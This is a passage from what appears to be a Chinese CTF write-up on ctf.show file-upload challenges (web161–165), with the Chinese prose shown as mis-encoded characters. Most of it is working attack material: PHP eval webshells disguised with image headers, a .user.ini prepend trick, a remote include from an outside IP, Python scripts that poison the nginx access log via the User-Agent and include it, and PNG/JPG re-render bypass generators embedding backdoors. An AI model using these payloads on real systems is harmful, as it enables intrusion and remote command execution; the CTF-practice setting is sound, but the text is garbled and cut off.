å›¾ç‰‡å¤´GIF89a)</h4><p>å¢åŠ äº†å¯¹å›¾ç‰‡å¤´çš„è¯†åˆ«ï¼Œç”¨äº†getimagesize()è¿›è¡Œæ£€æµ‹</p><p>getimagesize(): ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚</p><p>inié—®ä»·å’Œä¸€å¥è¯æœ¨é©¬å‰éƒ½è¦åŠ ä¸€å¥GIF89aï¼Œæˆ–è€…æ”¹æˆpngæ–‡ä»¶å¤´89 50 4E 47</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web162-æ¡ä»¶ç«äº‰-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#web162-æ¡ä»¶ç«äº‰-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="web162(æ¡ä»¶ç«äº‰ è¿œç¨‹æ–‡ä»¶åŒ…å«)"></a>web162(æ¡ä»¶ç«äº‰ è¿œç¨‹æ–‡ä»¶åŒ…å«)</h4><p>å†…å®¹banäº†<code>.</code>ä¹‹å‰æ–¹æ³•å°±ä¸è¡Œäº†ï¼Œå¯ä»¥åŒ…å«<code>/tmp/sess_&#123;sessid&#125;</code>è¿›è¡Œæ¡ä»¶ç«äº‰</p><p>ä¹Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«</p><ol><li><p>å°†æœ¨é©¬ä¸Šä¼ è‡³è¿œç¨‹æœåŠ¡å™¨ï¼Œç”±äºè¿‡æ»¤äº†. æ‰€ä»¥éœ€è¦è½¬æ¢ä¸‹ï¼Œmm</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>æˆ–è€…<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>ä¸Šä¼ åŒ…å«æ–‡ä»¶ .user.ini</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">txt</span></code></pre></li><li><p>ä¸Šä¼ è¿œç¨‹è°ƒç”¨æ–‡ä»¶ txt <a href="https://www.bejson.com/convert/ip2int/">IPè½¬æ•°å­—</a></p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"http://æ•°å­—IP/mm"</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>è®¿é—®upload</p></li></ol><p><strong>ä½†æ˜¯æˆ‘åœ¨å°è¯•çš„æ—¶å€™ï¼Œæ€»æ˜¯è¿”å›400ğŸ˜…</strong></p><p>äºæ˜¯çœ‹åˆ°äº†å¦ä¸€ä¸ªéé¢„æœŸï¼Œé€šè¿‡å¼‚æˆ–ç¼–ç ç»•è¿‡è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨ python çš„ urllib.parse.unquote å‡½æ•°ç¼–ç å‚æ•°ï¼Œéœ€è¦è‡ªè¡Œå†™ä¸€ä¸ª int2byte </p><p>çš„å‡½æ•°ï¼Œè¿™é‡Œé‡åˆ°ä¸ªå‘ã€‚</p><p>é¡ºå¸¦ç”¨ python å®ç°äº†ä¸‹ php ä¸­å¯¹å­—ç¬¦ä¸²çš„å–åï¼Œå…¶å®å°±æ˜¯ <code>255 - å­—ç¬¦çš„ascii</code> å¾—åˆ°çš„ ascii å–å­—ç¬¦ã€‚äºæ˜¯å°±æœ‰äº†å¦‚ä¸‹è„šæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"/var/log/nginx/access.log"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://f0c1c895-2920-42b8-8f40-cff4a3a610b3.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 &lt;?=system('tac ../fla*');?>"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h4><p>ä¸Šä¼ å›¾ç‰‡åï¼Œä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¸Šä¼ çš„ç¬é—´ï¼Œå°±postå‘½ä»¤æ‰§è¡Œï¼Œè¿˜å¯ä»¥ç›´æ¥åœ¨é…ç½®æ–‡ä»¶é‡Œè¿œç¨‹åŒ…å«ï¼Œç„¶åè®¿é—®&#x2F;upload&#x2F;index.phpã€‚</p><p>è¿™æ ·å°±ä¸ç”¨å³æ—¶å»postäº†ã€‚ï¼ˆè¿™ä¸ªè¦æ±‚æœåŠ¡å™¨å¼€å¯äº†è¿œç¨‹åŒ…å«é€‰é¡¹ï¼‰</p><p>åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"php://filter/convert.base64-encode/resource=/var/www/html/flag.php"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://ff4fcc76-8205-41ea-a4ba-52f257147647.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web164-pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#web164-pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web164(pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“)"></a>web164(pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“)</h4><p>è¿™ä¸€å…³è€ƒå¯Ÿpngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼Œç»è¿‡ä¸Šä¼ å›¾ç‰‡åå†æ¬¡å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ç»è¿‡å¯¹æ¯”ï¼Œä½¿ç”¨010editorå‘ç°ç»è¿‡äº†äºŒæ¬¡æ¸²æŸ“ï¼Œå¾ˆå¤šåœ°æ–¹çš„æ•°æ®éƒ½</p><p>ä¸ä¸€æ ·äº†</p><blockquote><p>æ‰€è°“äºŒæ¬¡æ¸²æŸ“ï¼Œå°±æ˜¯ç½‘ç«™å°†ç”¨æˆ·æ‰€ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç”±äºå„ç§åŸå› ï¼ˆé€‚é…ç½‘ç«™æ˜¾ç¤ºï¼Œé˜²æ­¢æœ¨é©¬ï¼‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œå¯¹äºŒæ¬¡æ¸²</p><p>æŸ“çš„ç»•è¿‡å³å°†æºæ–‡ä»¶ä¸ä¸Šä¼ ä¹‹åçš„æ–‡ä»¶è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾å‡ºæ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„æ•°æ®ä½ç½®ï¼Œå°†åé—¨ä»£ç æ’å…¥æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„æ•°æ®çš„ä½ç½®ã€‚å¯¹äº</p><p>ç»•è¿‡äºŒæ¬¡æ¸²æŸ“ï¼Œäººå·¥ç»•è¿‡å‡ ä¹ä¸å¯èƒ½ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨è„šæœ¬æ¥è¿›è¡Œæ„å»ºå›¾ç‰‡é©¬ã€‚</p></blockquote><p>æŸä¸çŸ¥åä½¬å†™çš„ä»£ç ,å‚è€ƒ<a href="https://blog.csdn.net/qq_46918279/article/details/120575503">CTFSHOW-æ–‡ä»¶ä¸Šä¼ </a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span> <span class="token comment">/* æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?> */</span><span class="token comment">//imagepng($img,'1.png');  è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨</span><span class="token comment">//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡</span><span class="token comment">//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);</span><span class="token comment">//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php</span> <span class="token delimiter important">?></span></span>------------------------------------           åˆ›å»º1.pngå›¾ç‰‡æˆåŠŸï¼      ------------------------------------</code></pre><p><img src="web164.png" loading="lazy"></p><h4 id="web165-jpgäºŒæ¬¡æ¸²æŸ“"><a href="#web165-jpgäºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web165(jpgäºŒæ¬¡æ¸²æŸ“)"></a>web165(jpgäºŒæ¬¡æ¸²æŸ“)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=eval(\$_POST[7]);?>"</span><span class="token punctuation">;</span> <span class="token comment">//æ³¨æ„$è½¬ä¹‰</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 